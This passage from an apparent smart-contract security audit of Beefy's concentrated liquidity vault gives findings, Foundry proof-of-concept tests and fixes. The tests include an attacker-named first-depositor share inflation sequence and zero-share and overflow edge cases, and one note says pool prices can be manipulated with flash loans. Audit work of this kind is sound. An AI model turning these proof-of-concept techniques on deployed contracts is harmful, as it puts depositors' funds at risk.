    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;
    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;
    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;
    int24 constant width = 500;
    address constant user     = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;
    address constant attacker = address(0x1337);
    bytes tradePath1;
    bytes tradePath2;
    bytes path0;
    bytes path1;

    function setUp() public {
        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();
        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));
        vault = vaultFactory.cloneVault();
        implementation = new StrategyPassiveManagerUniswap();
        factory = new StrategyFactory(keeper);

        address[] memory lpToken0ToNative = new address[](2);
        lpToken0ToNative[0] = token0;
        lpToken0ToNative[1] = native;

        address[] memory lpToken1ToNative = new address[](2);
        lpToken1ToNative[0] = token1;
        lpToken1ToNative[1] = native;

        uint24[] memory fees = new uint24[](1);
        fees[0] = 500;

        path0 = routeToPath(lpToken0ToNative, fees);
        path1 = routeToPath(lpToken1ToNative, fees);

        address[] memory tradeRoute1 = new address[](2);
        tradeRoute1[0] = token0;
        tradeRoute1[1] = token1;

        address[] memory tradeRoute2 = new address[](2);
        tradeRoute2[0] = token1;
        tradeRoute2[1] = token0;

        tradePath1 = routeToPath(tradeRoute1, fees);
        tradePath2 = routeToPath(tradeRoute2, fees);

        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(
            address(vault),
            unirouter,
            keeper,
            strategist,
            beefyFeeRecipient,
            beefyFeeConfig
        );

        factory.addStrategy("StrategyPassiveManagerUniswap_v1", address(implementation));

        address _strategy = factory.createStrategy("StrategyPassiveManagerUniswap_v1");
        strategy = StrategyPassiveManagerUniswap(_strategy);
        strategy.initialize(
            pool,
            native,
            width,
            path0,
            path1,
            commonAddresses
        );

        // render calm check ineffective to allow deposit to work; not related to the
        // identified bug, for some reason the first deposit was failing due to the calm
        // check
        strategy.setTwapInterval(1);

        vault.initialize(address(strategy), "Moo Vault", "mooVault");
    }

    // run with:
    // forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth -vvv
    function test_FirstDepositorCanInflateTheirShares() public {
        uint256 ATKR_INIT_BTC  = 1e8;
        uint256 ATKR_INIT_USDC = 60000e6;

        deal(address(token0), attacker, ATKR_INIT_BTC);
        deal(address(token1), attacker, ATKR_INIT_USDC);

        // attacker is the first depositor
        deposit(attacker, false, ATKR_INIT_BTC, ATKR_INIT_USDC);
        // log attacker's initial shares
        uint256 attackerInitialShares = vault.balanceOf(attacker);
        console.log(attackerInitialShares); // 126933306417

        // attacker now repeatedly recycles their tokens
        // through multiple cycles of deposits & withdrawals
        // to massively inflate their share count
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));
        withdraw(attacker, 0);
        deposit(attacker, false, IERC20(token0).balanceOf(attacker), IERC20(token1).balanceOf(attacker));

        uint256 attackerInflatedShares = vault.balanceOf(attacker);
        console.log(attackerInflatedShares); // 10593553436750

        // Through repeated deposits & withdraws, the attacker as
        // the first depositor has inflated their share count from:
        // initial: 126933306417
        // now    : 10577774612583

        // innocent user deposits their tokens
        deal(address(token0), user, ATKR_INIT_BTC);
        deal(address(token1), user, ATKR_INIT_USDC);

        deposit(user, false, ATKR_INIT_BTC, ATKR_INIT_USDC);

        // log user's initial shares
        uint256 userInitialShares = vault.balanceOf(user);
        console.log(userInitialShares); // 10577775729666

        // this attack doesn't seem to benefit the first depositor
        // since the user who subsequently deposits gets a similar
        // amount of shares.
    }

    function deposit(address depositor, bool dealTokens, uint256 token0Amount, uint256 token1Amount) public {
        vm.startPrank(depositor);

        if(dealTokens) {
            deal(address(token0), depositor, token0Amount);
            deal(address(token1), depositor, token1Amount);
        }

        IERC20(token0).approve(address(vault), token0Amount);
        IERC20(token1).approve(address(vault), token1Amount);

        uint _shares = vault.previewDeposit(token0Amount, token1Amount);

        vault.depositAll(_shares);

        vm.stopPrank();
    }

    function withdraw(address withdrawer, uint256 sharesAmount) public {
        vm.startPrank(withdrawer);

        uint256 maxShares = vault.balanceOf(withdrawer);
        if(sharesAmount == 0) {
            sharesAmount = maxShares;
        } else {
            sharesAmount = bound(sharesAmount, 1, maxShares);
        }

        (uint256 _slip0, uint256 _slip1) = vault.previewWithdraw(sharesAmount);
        vault.withdraw(sharesAmount, _slip0, _slip1);

        vm.stopPrank();
    }

    // Convert token route to encoded path
    // uint24 type for fees so path is packed tightly
    function routeToPath(
        address[] memory _route,
        uint24[] memory _fee
    ) internal pure returns (bytes memory path) {
        path = abi.encodePacked(_route[0]);
        uint256 feeLength = _fee.length;
        for (uint256 i = 0; i < feeLength; i++) {
            path = abi.encodePacked(path, _fee[i], _route[i+1]);
        }
    }
}
```
Run with: forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth -vv

**Recommended Mitigation:** Rework the `token1EquivalentBalance` calculation in `BeefyVaultConcLiq::deposit` [L178-179](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L178-L179).

**Beefy:**
We believe this is working as intended due to sending some of the shares from the first depositor to the burn address.


### `StrategyPassiveManagerUniswap::price` will revert due to overflow for large but valid `sqrtPriceX96`

**Description:** The maximum value of `sqrtPriceX96` is [1461446703485210103287273052203988822378723970342](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/TickMath.sol#L16) but `StrategyPassiveManagerUniswap::price` will revert due to overflow for values much lower than this.

**Impact:** Functionality such as deposits which depend on `StrategyPassiveManagerUniswap::price` will revert resulting in denial of service.

**Proof of Concept:** A stand-alone Foundry fuzz test:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "../src/FullMath.sol";
import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract PriceTest
contract PriceTest is Test {

    uint256 private constant PRECISION = 1e36;

    function price(uint160 sqrtPriceX96) internal pure returns (uint256 _price) {
        _price = FullMath.mulDiv(uint256(sqrtPriceX96) ** 2, PRECISION, (2 ** 192));
    }

    function test_price(uint160 sqrtPriceX96) external {
        price(sqrtPriceX96);
    }
}
```

Running it shows the overflow:
```solidity
encountered 1 failing test in test/PriceTest.t.sol:PriceTest
[FAIL. Reason: panic: arithmetic underflow or overflow (0x11); counterexample:
calldata=0x4f3b91450000000000000000000000000000000100000000000000000000000000000000
args=[340282366920938463463374607431768211456 [3.402e38]]] test_price(uint160)
(runs: 3, : 1319, ~: 1421)
```

**Recommended Mitigation:** Rethink the implementation of `StrategyPassiveManagerUniswap::price`.

**Beefy:**
Fixed in commits [4f061b1](https://github.com/beefyfinance/experiments/commit/4f061b18c0a99392770f68f8c6762fba3c096e97), [1ae1649](https://github.com/beefyfinance/experiments/commit/1ae16493d03417d63010fe034672876b2364c284).

**Cyfrin:** Verified that the function no longer reverts. The fix does introduce a slight precision loss as illustrated by this stand-alone stateless fuzz test:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "../src/FullMath.sol";
import {Math} from "openzeppelin-contracts/utils/math/Math.sol";
import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract PriceTest

contract PriceTest is Test {

    uint256 private constant PRECISION = 1e36;

    function price(uint160 sqrtPriceX96) internal pure returns (uint256 _price) {
        _price = FullMath.mulDiv(uint256(sqrtPriceX96) ** 2, PRECISION, (2 ** 192));
    }

    function newPrice(uint160 sqrtPriceX96) internal pure returns (uint256 _price) {
        _price = FullMath.mulDiv(uint256(sqrtPriceX96), Math.sqrt(PRECISION), (2 ** 96)) ** 2;
    }

    function test_price(uint160 sqrtPriceX96) external {
        assertEq(price(sqrtPriceX96), newPrice(sqrtPriceX96));
    }
}
```

which produces the following output:
```
Ran 1 test for test/PriceTest.t.sol:PriceTest
[FAIL. Reason: assertion failed; counterexample: calldata=0x4f3b9145000000000000000000000000000000000000000000000000000000293f884ffb args=[177159557115 [1.771e11]]] test_price(uint160) (runs: 19, : 2553, ~: 2553)
Logs:
  Error: a == b not satisfied [uint]
        Left: 5
       Right: 4
```


### Withdraw can return zero tokens while burning a positive amount of shares

**Description:** Invariant fuzzing found an edge-case where a user could burn an amount of shares > 0 but receive zero output tokens. The cause appears to be a rounding down to zero precision loss for small `_shares` value in `BeefyVaultConcLiq::withdraw` [L220-221](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L220-L221):
```solidity
uint256 _amount0 = (_bal0 * _shares) / _totalSupply;
uint256 _amount1 = (_bal1 * _shares) / _totalSupply;
```

**Impact:** Protocol can enter a state where a user burns their shares but receives zero output tokens in return.

**Proof of Concept:** Invariant fuzz testing suite supplied at the conclusion of the audit.

**Recommended Mitigation:** Change the slippage check to also revert if no output tokens are returned:
```solidity
if (_amount0 < _minAmount0 || _amount1 < _minAmount1 ||
   (_amount0 == 0 && _amount1 == 0)) revert TooMuchSlippage();
```

**Beefy:**
Fixed in commit [04acaee](https://github.com/beefyfinance/experiments/commit/04acaeecca9a69f0cc1399dac68da21fcf598f17).

**Cyfrin:** Verified.


### Deposit can return zero shares when user deposits a positive amount of tokens

**Description:** Stateless fuzzing found an edge-case where a user could deposit an amount of tokens > 0 but receive zero output shares. The cause appears to be either a rounding down to zero precision loss in the share calculation [L179](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L179) due to small amounts or the subtraction of the minimum share amount [L182](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L182) from the first depositor, combined with no zero share check after this occurs.

Interestingly `BeefyVaultConcLiq::deposit` does have a check to prevent zero shares [L173](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L173) being minted but the share amount is subsequently modified after this check occurs.

**Impact:** Protocol can enter a state where a user deposits a positive amount of tokens but receives zero output shares in return.

**Proof of Concept:** Add this test file `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol`:
```solidity
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin-4/contracts/token/ERC20/ERC20.sol";
import {BeefyVaultConcLiq} from "contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol";
import {BeefyVaultConcLiqFactory} from "contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol";
import {StrategyPassiveManagerUniswap} from "contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol";
import {StrategyFactory} from "contracts/protocol/concliq/uniswap/StrategyFactory.sol";
import {StratFeeManagerInitializable} from "contracts/protocol/beefy/StratFeeManagerInitializable.sol";
import {IStrategyConcLiq} from "contracts/interfaces/beefy/IStrategyConcLiq.sol";
import {UniV3Utils} from "contracts/interfaces/exchanges/UniV3Utils.sol";

// Test WBTC/USDC Uniswap Strategy
contract ConLiqWBTCUSDCTest is Test {
    BeefyVaultConcLiq vault;
    BeefyVaultConcLiqFactory vaultFactory;
    StrategyPassiveManagerUniswap strategy;
    StrategyPassiveManagerUniswap implementation;
    StrategyFactory factory;
    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;
    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;
    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;
    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;
    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;
    int24 constant width = 500;
    address constant user     = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;
    address constant attacker = address(0x1337);
    bytes tradePath1;
    bytes tradePath2;
    bytes path0;
    bytes path1;

    function setUp() public {
        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();
        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));
        vault = vaultFactory.cloneVault();
        implementation = new StrategyPassiveManagerUniswap();
        factory = new StrategyFactory(keeper);

        address[] memory lpToken0ToNative = new address[](2);
        lpToken0ToNative[0] = token0;
        lpToken0ToNative[1] = native;

        address[] memory lpToken1ToNative = new address[](2);
        lpToken1ToNative[0] = token1;
        lpToken1ToNative[1] = native;

        uint24[] memory fees = new uint24[](1);
        fees[0] = 500;

        path0 = routeToPath(lpToken0ToNative, fees);
        path1 = routeToPath(lpToken1ToNative, fees);

        address[] memory tradeRoute1 = new address[](2);
        tradeRoute1[0] = token0;
        tradeRoute1[1] = token1;

        address[] memory tradeRoute2 = new address[](2);
        tradeRoute2[0] = token1;
        tradeRoute2[1] = token0;

        tradePath1 = routeToPath(tradeRoute1, fees);
        tradePath2 = routeToPath(tradeRoute2, fees);

        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(
            address(vault),
            unirouter,
            keeper,
            strategist,
            beefyFeeRecipient,
            beefyFeeConfig
        );

        factory.addStrategy("StrategyPassiveManagerUniswap_v1", address(implementation));

        address _strategy = factory.createStrategy("StrategyPassiveManagerUniswap_v1");
        strategy = StrategyPassiveManagerUniswap(_strategy);
        strategy.initialize(
            pool,
            native,
            width,
            path0,
            path1,
            commonAddresses
        );

        // render calm check ineffective to allow deposit to work; not related to the
        // identified bug, for some reason the first deposit was failing due to the calm
        // check
        strategy.setTwapInterval(1);

        vault.initialize(address(strategy), "Moo Vault", "mooVault");
    }

    // run with:
    // forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv
    function test_DepositResultsInZeroShares(uint32 token0Amount, uint32 token1Amount) public {
        // satisfy minimum share to prevent reverting due to underflow
        vm.assume( (token1Amount + (token0Amount * strategy.price() / 1e36)) == 10**3 );

        uint256 userInitShares = vault.balanceOf(user);

                            // 0           // 1000
        deposit(user, true, token0Amount, token1Amount);

        uint256 userAfterShares = vault.balanceOf(user);

        console.log(userInitShares);  // 0
        console.log(userAfterShares); // 0

        // shares should have increased
        assert(userInitShares < userAfterShares);
    }

    // handlers
    function deposit(address depositor, bool dealTokens, uint256 token0Amount, uint256 token1Amount) public {
        vm.startPrank(depositor);

        if(dealTokens) {
            deal(address(token0), depositor, token0Amount);
            deal(address(token1), depositor, token1Amount);
        }

        IERC20(token0).approve(address(vault), token0Amount);
        IERC20(token1).approve(address(vault), token1Amount);

        uint256 _shares = vault.previewDeposit(token0Amount, token1Amount);

        vault.depositAll(_shares);

        vm.stopPrank();
    }

    // Convert token route to encoded path
    // uint24 type for fees so path is packed tightly
    function routeToPath(
        address[] memory _route,
        uint24[] memory _fee
    ) internal pure returns (bytes memory path) {
        path = abi.encodePacked(_route[0]);
        uint256 feeLength = _fee.length;
        for (uint256 i = 0; i < feeLength; i++) {
            path = abi.encodePacked(path, _fee[i], _route[i+1]);
        }
    }
}
```

Run with: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv`

**Recommended Mitigation:** Check for zero shares again before minting shares to the user.

**Beefy:**
Fixed in commit [bee75ac](https://github.com/beefyfinance/experiments/commit/bee75ac2e2ec0d94093ee8f5c3361f98119604bc).

**Cyfrin:** Verified.


### Some tokens will be stuck in the protocol forever

**Description:** Due to the shares donated by the first depositor, some tokens will never be able to be withdrawn but will instead be stuck in the protocol forever.

**Impact:** Some tokens will be permanently stuck in the protocol.

**Recommended Mitigation:** Implement an "end-of-life" state for the protocol which:
1) can only be called by the owner when `StrategyPassiveManagerUniswap` is paused and `BeefyVaultConcLiq::totalSupply == MINIMUM_SHARES` (in this state all users have withdrawn and liquidity has been removed)
2) sends all remaining tokens to `StratFeeManagerInitializable::beefyFeeRecipient`
3) puts the protocol into an "end-of-life" state such that no further functions can be executed

**Beefy:**
Fixed in commit [b520517](https://github.com/beefyfinance/experiments/commit/b520517486fa88da062116f6327ee938dd0b4fb4).

**Cyfrin:** Verified.

\clearpage
## Informational


### Using `pool.slot0` can be easily manipulated

**Description:** `StrategyPassiveManagerUniswap::sqrtPrice` gets the current tick and the current price [using](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L544) `pool.slot0`.

This price is used in a number of functions such as `_addLiquidity` [L217](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L217), `_checkAmounts` [L283](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L283), `balancesOfPool` [L452](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L452), `_setAltTick` [L601](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L601) and `price` [L535](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L535) and in `BeefyVaultConcLiq::previewDeposit` [L117](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L117) and `deposit` [L170](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L170) while the current tick is used to calculate the LP range.

`pool.slot0` can be [easily manipulated](https://solodit.xyz/issues/h-10-ichilporacle-is-extemely-easy-to-manipulate-due-to-how-ichivault-calculates-underlying-token-balances-sherlock-blueberry-blueberry-git) via flash loans to return arbitrary value price and tick values. In Beefy's case this can allow an attacker to force the protocol to deploy its liquidity into an unfavorable range.

Beefy is aware of this risk and has implemented an [`_onlyCalmPeriods`](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L96-L102) function that prevents many functions from working if the pool has been abruptly manipulated. However as our Critical finding has shown, any asymmetry in the implementation of `_onlyCalmPeriods` can lead to the protocol being drained.

Hence we note the use of `pool.slot0` as a risk for this codebase as it continues to evolve, especially around functions that set the LP range from the current tick and deploy the protocol's liquidity.

**Beefy:**
Acknowledged.


### `StrategyPassiveManagerUniswap::twapInterval` should be `uint32`

**Description:** Given that `twapInterval` corresponds to a time interval it makes better sense to define it to as `uint32`, avoiding possible wrong assignment through `setTwapInterval` which can affect behavior of `twap()`.

**Beefy:**
Fixed in commit [b520517](https://github.com/beefyfinance/experiments/commit/b520517486fa88da062116f6327ee938dd0b4fb4).

**Cyfrin:** Verified.


### Consider enforcing a min TWAP interval in `StrategyPassiveManagerUniswap::setTwapInterval` to avoid dangerous assignment

**Description:** The way TWAP oracle works in UniswapV3 is:

$$tickCumulative(pool,time_{A},time_{B}) = \sum_{i=time_{A}}^{time_{B}} Price_{i}(pool)$$

$$TWAP(pool,time_{A},time_{B}) = \frac{tickCumulative(pool,time_{A},time_{B})}{time_{B} - time_{A}}$$

In this way, if $time_{B} - time_{A}$ is too low it would be relatively easy to manipulate TWAP output. Since $time_{B} - time_{A}$ is represented by `twapInterval`, it would be better to enforce a min value, for instance 5 minutes (consider that current Ethereum blocks emission rate is around 12 seconds).

**Beefy:**
Fixed in commit [b5769c4](https://github.com/beefyfinance/experiments/commit/b5769c4ccad6357ac9d3de2c682749bbaeeae6d1).

**Cyfrin:** Verified.


### Use existing `price` function in `StrategyPassiveManagerUniswap::_setAltTick`

**Description:** `StrategyPassiveManagerUniswap` has a `price` function that [converts](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L534-L537) `sqrtPriceX96` returned by uniswap `pool.slot0`.

Refactor `_setAltTick` [L601-604](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L601-L604) to use the existing `price` function to reduce code duplication and the possibility for errors creeping in when implementing the same functionality in multiple places:

```solidity
if (bal0 > 0) {
    amount0 = bal0 * price() / PRECISION;
}
```

This also allows for the removal of the `price1` variable declaration inside `_setAltTick`.

**Beefy:**
Fixed in commit [b5b609e](https://github.com/beefyfinance/experiments/commit/b5b609ec38938b15dc20a5ac187111019b82ebc5).

**Cyfrin:** Verified.


### Use existing `available` function in `BeefyVaultConcLiq::balances`

**Description:** `BeefyVaultConcLiq` has an `available` function that [returns](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L91-L94) the token balances held by the vault contract.

Refactor `balances` [L81-83](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L81-L83) to use the existing `available` function to reduce code duplication and the possibility for errors creeping in when implementing the same functionality in multiple places.

One possible refactoring:
```solidity
(uint256 stratBal0, uint256 stratBal1) = IStrategyConcLiq(strategy).balances();
(uint256 vaultBal0, uint256 vaultBal1) = available();
return (stratBal0 + vaultBal0, stratBal1 + vaultBal1);
```

**Beefy:**
In commit [38ee643](https://github.com/beefyfinance/experiments/commit/38ee643ab661aba48f73b673ef2c8ed5ac63ed00) we removed the available function and exclude vault balances, as they are not accounted for in deposit or withdraw functions. They can be rescued by an owner function if for some reason someone sends tokens to the vault contract.


### Rename `StrategyPassiveManagerUniswap::price` to `scaledUpPrice` to explicitly indicate returned price is scaled up

**Description:** The current implementation of function `price` returns the price scaled up but the function name doesn't indicate this. Other places in the code that use this function do scale the price down, but the risk is that in the future as the protocol continues to evolve another developer may call the `price` function without realizing the returned price is scaled up and hence won't scale it down.

**Recommended mitigation:**
Rename the function to `scaledUpPrice` such that the function callers are explicitly informed they need to scale it down.

**Beefy:**
Fixed in commit [319cfa0](https://github.com/beefyfinance/experiments/commit/319cfa013263bdab8790bebaa041737e30f52c3b).

**Cyfrin:** Verified.


### Use `Ownable2StepUpgradeable` instead of `OwnableUpgradeable`, `Ownable2Step` instead of `Ownable`

**Description:** `StratFeeManagerInitializable` and `BeefyVaultConcLiq` should use `Ownable2StepUpgradeable` instead of `OwnableUpgradeable`.

`StrategyFactory` should use `Ownable2Step` instead of `Ownable`.

The 2-step ownable contracts are to be preferred for [safer](https://www.rareskills.io/post/openzeppelin-ownable2step) ownership transfers.

**Beefy:**
Acknowledged.


### Use a specific version of Solidity instead of a wide version

**Description:** `StratFeeManagerInitializable` should use `pragma solidity 0.8.23;` instead of `pragma solidity ^0.8.23;`.

**Beefy:**
Acknowledged.


### `public` functions not used internally could be marked `external`

**Description:** `public` functions not used internally could be marked `external`:

- Found in contracts/protocol/beefy/StratFeeManagerInitializable.sol [Line: 190](contracts/protocol/beefy/StratFeeManagerInitializable.sol#L190)

	```solidity
	    function lockedProfit() public virtual view returns (uint256 locked0, uint256 locked1) {
	```

- Found in contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol [Line: 555](contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L555)

	```solidity
	    function price() public view returns (uint256 _price) {
	```

- Found in contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol [Line: 700](contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L700)

	```solidity
	    function lpToken0ToNative() public view returns (address[] memory) {
	```

- Found in contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol [Line: 709](contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L709)

	```solidity
	    function lpToken1ToNative() public view returns (address[] memory) {
	```

- Found in contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol [Line: 45](contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L45)

	```solidity
	     function initialize(
	```

- Found in contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol [Line: 60](contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L60)

	```solidity
	    function want() public view returns (address _want) {
	```

- Found in contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol [Line: 91](contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L91)

	```solidity
	    function available() public view returns (uint, uint) {
	```

- Found in contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol [Line: 102](contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L102)

	```solidity
	    function previewWithdraw(uint256 _shares) public view returns (uint256 amount0, uint256 amount1) {
	```

- Found in contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol [Line: 116](contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L116)

	```solidity
	    function previewDeposit(uint256 _amount0, uint256 _amount1) public view returns (uint256 shares) {
	```

**Beefy:**
Fixed in commit [139c3f9](https://github.com/beefyfinance/experiments/commit/139c3f9b1f77b78f87f3e1ffe08d79831979ee4e).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Cache storage variables in memory when read multiple times without being changed

**Description:** As reading from storage is considerably more expensive than reading from memory, cache storage variables in memory when read multiple times without being changed:

File: `StrategyPassiveManagerUniswap.sol`
```solidity
// @audit cache `vault` to save 2 storage reads;
// ideally `_onlyVault()` would return the vault
200:        if (_amount0 > 0) IERC20Metadata(lpToken0).safeTransfer(vault, _amount0);
201:        if (_amount1 > 0) IERC20Metadata(lpToken1).safeTransfer(vault, _amount1);

// @audit cache `positionMain.tickLower` to save 4 storage reads
// @audit cache `positionMain.tickUpper` to save 4 storage reads
// @audit cache `pool` to save ` storage read
220:            TickMath.getSqrtRatioAtTick(positionMain.tickLower),
221:            TickMath.getSqrtRatioAtTick(positionMain.tickUpper),
226:        bool amountsOk = _checkAmounts(liquidity, positionMain.tickLower, positionMain.tickUpper);
231:            IUniswapV3Pool(pool).mint(address(this), positionMain.tickLower, positionMain.tickUpper, liquidity, "Beefy Main");
239:            TickMath.getSqrtRatioAtTick(positionAlt.tickLower),
240:            TickMath.getSqrtRatioAtTick(positionAlt.tickUpper),
248:            IUniswapV3Pool(pool).mint(address(this), positionAlt.tickLower, positionAlt.tickUpper, liquidity, "Beefy Alt");

// @audit cache `pool' to save 5 storage reads
// @audit cache `positionMain.tickLower` to save 1 storage read
// @audit cache `positionAlt.tickUpper` to save 1 storage read
259:        (uint128 liquidity,,,,) = IUniswapV3Pool(pool).positions(keyMain);
260:        (uint128 liquidityAlt,,,,) = IUniswapV3Pool(pool).positions(keyAlt);
264:            IUniswapV3Pool(pool).burn(positionMain.tickLower, positionMain.tickUpper, liquidity);
265:            IUniswapV3Pool(pool).collect(address(this), positionMain.tickLower, positionMain.tickUpper, type(uint128).max, type(uint128).max);
269:            IUniswapV3Pool(pool).burn(positionAlt.tickLower, positionAlt.tickUpper, liquidityAlt);
270:            IUniswapV3Pool(pool).collect(address(this), positionAlt.tickLower, positionAlt.tickUpper, type(uint128).max, type(uint128).max);

// @audit cache `pool' to save 5 storage reads
// @audit cache `positionMain.tickLower` to save 1 storage read
// @audit cache `positionAlt.tickUpper` to save 1 storage read
338:        (uint128 liquidity,,,,) = IUniswapV3Pool(pool).positions(keyMain);
339:        (uint128 liquidityAlt,,,,) = IUniswapV3Pool(pool).positions(keyAlt);
342:        if (liquidity > 0) IUniswapV3Pool(pool).burn(positionMain.tickLower, positionMain.tickUpper, 0);
343:        if (liquidityAlt > 0) IUniswapV3Pool(pool).burn(positionAlt.tickLower, positionAlt.tickUpper, 0);
346:        (uint256 fee0, uint256 fee1) = IUniswapV3Pool(pool).collect(address(this), positionMain.tickLower, positionMain.tickUpper, type(uint128).max, type(uint128).max);
347:        (uint256 feeAlt0, uint256 feeAlt1) = IUniswapV3Pool(pool).collect(address(this), positionAlt.tickLower, positionAlt.tickUpper, type(uint128).max, type(uint128).max);

// @audit cache `pool` to save 1 storage read
